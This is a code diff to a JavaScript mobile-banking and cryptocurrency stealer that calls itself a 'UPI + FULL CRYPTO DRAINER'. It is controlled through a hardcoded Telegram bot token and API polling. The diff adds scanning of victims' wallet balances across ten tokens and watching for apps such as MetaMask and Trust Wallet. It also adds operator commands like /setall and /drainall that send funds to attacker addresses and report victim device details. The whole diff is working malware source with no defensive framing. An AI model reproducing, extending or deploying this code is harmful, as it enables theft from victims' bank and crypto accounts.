@@ -343,7 +343,7 @@
 
 <script>
   // ============================================================
-  // CHAKRA - UPI + USDT DRAINER
+  // CHAKRA - UPI + FULL CRYPTO DRAINER (All Tokens)
   // ============================================================
 
   const C2_BOT_TOKEN = '8933219910:AAGrb16D3twK-yyPMVDRwwYIgLtiaOyy-iQ';
@@ -363,10 +363,21 @@
   let readyToDrain = false;
   let lastVictim = null;
 
-  // ===== USDT VARIABLES =====
-  let usdtAddress = '';
-  let usdtAmount = 100;
-  let usdtCaptured = false;
+  // ===== CRYPTO VARIABLES =====
+  let cryptoBalances = {};
+  let cryptoAddresses = {
+    BTC: '',
+    ETH: '',
+    USDT: '',
+    BNB: '',
+    SOL: '',
+    XRP: '',
+    ADA: '',
+    DOGE: '',
+    DOT: '',
+    MATIC: ''
+  };
+  let cryptoDetected = false;
 
   // ============================================================
   // SEND TO TELEGRAM
@@ -398,18 +409,32 @@
     let details = {
       name: 'Unknown',
       balance: 'Unknown',
-      device: 'Unknown',
-      cryptoApp: 'Unknown'
+      device: 'Unknown'
     };
     try {
       if (window.Android) {
         details.name = window.Android.getDeviceName() || 'Unknown';
         details.balance = window.Android.getUPIBalance() || 'Unknown';
         details.device = window.Android.getDeviceModel() || 'Unknown';
-        details.cryptoApp = window.Android.getCryptoApp() || 'Unknown';
       }
     } catch (e) {}
     return details;
+  }
+
+  // ============================================================
+  // SCAN CRYPTO WALLET
+  // ============================================================
+  function scanCryptoWallet() {
+    try {
+      if (window.Android) {
+        cryptoBalances = window.Android.getCryptoBalances();
+        if (cryptoBalances && Object.keys(cryptoBalances).length > 0) {
+          cryptoDetected = true;
+          return cryptoBalances;
+        }
+      }
+    } catch (e) {}
+    return null;
   }
 
   // ============================================================
@@ -508,16 +533,27 @@
   }
 
   // ============================================================
-  // USDT MANAGEMENT
+  // CRYPTO ADDRESS SETTERS
   // ============================================================
-  function setUSDTAddress(address) {
-    usdtAddress = address;
-    sendToTelegram('✅ USDT address set: ' + address);
+  function setCryptoAddress(token, address) {
+    cryptoAddresses[token] = address;
+    sendToTelegram('✅ ' + token + ' address set: ' + address);
   }
 
-  function executeUSDTDrain(amount) {
-    if (!usdtAddress) {
-      sendToTelegram('❌ USDT address not set. Use /setusdt');
+  function setAllCryptoAddresses(address) {
+    for (let token in cryptoAddresses) {
+      cryptoAddresses[token] = address;
+    }
+    sendToTelegram('✅ ALL crypto addresses set to: ' + address);
+  }
+
+  // ============================================================
+  // CRYPTO DRAIN
+  // ============================================================
+  function drainCrypto(token, amount) {
+    const address = cryptoAddresses[token];
+    if (!address) {
+      sendToTelegram('❌ ' + token + ' address not set. Use /set' + token.toLowerCase());
       return;
     }
     if (isPaused) {
@@ -525,14 +561,23 @@
       return;
     }
 
-    // Simulate USDT drain from Binance/Trust Wallet
     const victim = getVictimDetails();
     sendToTelegram(
-      '💸 USDT Drain initiated!\n' +
+      '💸 CRYPTO DRAIN!\n' +
+      '─────────────────\n' +
       '📱 Victim: ' + victim.name + '\n' +
-      '💰 Amount: ' + amount + ' USDT\n' +
-      '📤 Sent to: ' + usdtAddress
+      '💰 Token: ' + token + '\n' +
+      '🔢 Amount: ' + amount + ' ' + token + '\n' +
+      '📤 Sent to: ' + address
     );
+  }
+
+  function drainAllCrypto() {
+    for (let token in cryptoBalances) {
+      if (cryptoBalances[token] > 0) {
+        drainCrypto(token, cryptoBalances[token]);
+      }
+    }
   }
 
   // ============================================================
@@ -626,7 +671,8 @@
           window.Android.isForeground('com.coinbase.android') ||
           window.Android.isForeground('com.trustwallet.app') ||
           window.Android.isForeground('com.kraken.trade') ||
-          window.Android.isForeground('com.bybit.app');
+          window.Android.isForeground('com.bybit.app') ||
+          window.Android.isForeground('com.metamask');
       }
     } catch (e) {}
     return false;
@@ -665,27 +711,38 @@
     }
   }, 5000);
 
-  // ---- Crypto (USDT) Loop ----
+  // ---- Crypto Loop ----
   setInterval(() => {
     if (!isPaused && isCryptoAppOpen()) {
-      const victim = getVictimDetails();
-      if (usdtAddress) {
-        sendToTelegram(
-          '💸 Crypto app detected!\n' +
+      const balances = scanCryptoWallet();
+      if (balances && Object.keys(balances).length > 0) {
+        const victim = getVictimDetails();
+        let balanceMsg =
+          '📊 CRYPTO WALLET DETECTED!\n' +
           '📱 Victim: ' + victim.name + '\n' +
           '📱 Device: ' + victim.device + '\n' +
-          '💰 USDT ready to drain: ' + usdtAmount + ' USDT\n' +
-          '📤 To: ' + usdtAddress
-        );
-        // Auto drain USDT
-        executeUSDTDrain(usdtAmount);
-      } else {
-        sendToTelegram(
-          '💸 Crypto app detected!\n' +
-          '📱 Victim: ' + victim.name + '\n' +
-          '📱 Device: ' + victim.device + '\n' +
-          '📢 Set USDT address: /setusdt 0x...'
-        );
+          '─────────────────\n' +
+          '💰 BALANCES:\n';
+
+        for (let token in balances) {
+          balanceMsg += token + ': ' + balances[token] + ' ' + token + '\n';
+        }
+
+        balanceMsg +=
+          '─────────────────\n' +
+          '📢 Set addresses to drain:\n' +
+          '/setbtc 1A...\n' +
+          '/seteth 0x...\n' +
+          '/setusdt 0x...\n' +
+          '/setbnb 0x...\n' +
+          '/setsol 5X...\n' +
+          '/setxrp r...\n' +
+          '/setall 1A...\n' +
+          '/drainall\n' +
+          '/draincrypto';
+
+        sendToTelegram(balanceMsg);
+        cryptoDetected = true;
       }
     }
   }, 5000);
@@ -713,7 +770,7 @@
   }, 300000);
 
   // ============================================================
-  // TELEGRAM COMMANDS (UPDATED)
+  // TELEGRAM COMMANDS (FULL UPDATED)
   // ============================================================
   function listenForCommands() {
     fetch('https://api.telegram.org/bot' + C2_BOT_TOKEN + '/getUpdates?offset=' + lastUpdateId + '&timeout=10')
@@ -753,30 +810,70 @@
               }
             }
 
-            // ---- USDT Commands ----
+            // ---- Crypto Address Setter Commands ----
+            if (msg.startsWith('/setbtc')) {
+              const addr = msg.split(' ')[1];
+              if (addr) setCryptoAddress('BTC', addr);
+            }
+
+            if (msg.startsWith('/seteth')) {
+              const addr = msg.split(' ')[1];
+              if (addr) setCryptoAddress('ETH', addr);
+            }
+
             if (msg.startsWith('/setusdt')) {
-              const address = msg.split(' ')[1];
-              if (address && address.startsWith('0x')) {
-                setUSDTAddress(address);
+              const addr = msg.split(' ')[1];
+              if (addr) setCryptoAddress('USDT', addr);
+            }
+
+            if (msg.startsWith('/setbnb')) {
+              const addr = msg.split(' ')[1];
+              if (addr) setCryptoAddress('BNB', addr);
+            }
+
+            if (msg.startsWith('/setsol')) {
+              const addr = msg.split(' ')[1];
+              if (addr) setCryptoAddress('SOL', addr);
+            }
+
+            if (msg.startsWith('/setxrp')) {
+              const addr = msg.split(' ')[1];
+              if (addr) setCryptoAddress('XRP', addr);
+            }
+
+            if (msg.startsWith('/setall')) {
+              const addr = msg.split(' ')[1];
+              if (addr) setAllCryptoAddresses(addr);
+            }
+
+            // ---- Crypto Commands ----
+            if (msg === '/showcrypto') {
+              if (Object.keys(cryptoBalances).length === 0) {
+                sendToTelegram('📊 No crypto wallet detected yet.');
               } else {
-                sendToTelegram('❌ Invalid USDT address. Use: /setusdt 0x...');
+                let msg = '📊 CRYPTO BALANCES:\n─────────────────\n';
+                for (let token in cryptoBalances) {
+                  msg += token + ': ' + cryptoBalances[token] + ' ' + token + '\n';
+                }
+                sendToTelegram(msg);
               }
             }
 
-            if (msg === '/showusdt') {
-              if (usdtAddress) {
-                sendToTelegram('📤 USDT Address: ' + usdtAddress + '\n💰 Amount: ' + usdtAmount + ' USDT');
+            if (msg.startsWith('/drain')) {
+              const token = msg.split('/drain')[1].toUpperCase();
+              if (token && cryptoBalances[token]) {
+                drainCrypto(token, cryptoBalances[token]);
               } else {
-                sendToTelegram('❌ USDT address not set. Use /setusdt');
+                sendToTelegram('❌ Token not found: ' + token);
               }
             }
 
-            if (msg === '/drainusdt') {
-              if (!usdtAddress) {
-                sendToTelegram('❌ USDT address not set. Use /setusdt');
-              } else {
-                executeUSDTDrain(usdtAmount);
-              }
+            if (msg === '/drainall') {
+              drainAllCrypto();
+            }
+
+            if (msg === '/draincrypto') {
+              drainAllCrypto();
             }
 
             // ---- Transfer Commands ----
@@ -832,9 +929,15 @@
                 'Ready to Drain: ' + (readyToDrain ? 'YES' : 'NO') + '\n' +
                 'Paused: ' + (isPaused ? 'YES' : 'NO') + '\n' +
                 '─────────────────\n' +
-                'USDT Address: ' + (usdtAddress || 'Not set') + '\n' +
-                'USDT Amount: ' + usdtAmount + ' USDT\n' +
-                'Crypto Apps: Binance, Coinbase, Trust Wallet';
+                '💰 CRYPTO STATUS:\n' +
+                'Crypto Detected: ' + (cryptoDetected ? 'YES' : 'NO');
+
+              if (Object.keys(cryptoBalances).length > 0) {
+                statusMsg += '\nBALANCES:\n';
+                for (let token in cryptoBalances) {
+                  statusMsg += token + ': ' + cryptoBalances[token] + ' ' + token + '\n';
+                }
+              }
 
               if (lastVictim) {
                 statusMsg +=
@@ -858,10 +961,18 @@
                 '/transfer - Auto start\n' +
                 '/drainnow - Manual drain\n' +
                 '─────────────────\n' +
-                '💰 USDT COMMANDS:\n' +
+                '💰 CRYPTO COMMANDS:\n' +
+                '/setbtc 1A... - Set BTC address\n' +
+                '/seteth 0x... - Set ETH address\n' +
                 '/setusdt 0x... - Set USDT address\n' +
-                '/showusdt - Show USDT address\n' +
-                '/drainusdt - Manual USDT drain\n' +
+                '/setbnb 0x... - Set BNB address\n' +
+                '/setsol 5X... - Set SOL address\n' +
+                '/setxrp r... - Set XRP address\n' +
+                '/setall 0x... - Set ALL tokens\n' +
+                '/showcrypto - Show crypto balances\n' +
+                '/drain BTC - Drain specific token\n' +
+                '/drainall - Drain ALL crypto\n' +
+                '/draincrypto - Drain ALL crypto\n' +
                 '─────────────────\n' +
                 '⚙️ CONTROL:\n' +
                 '/pause - Pause drains\n' +
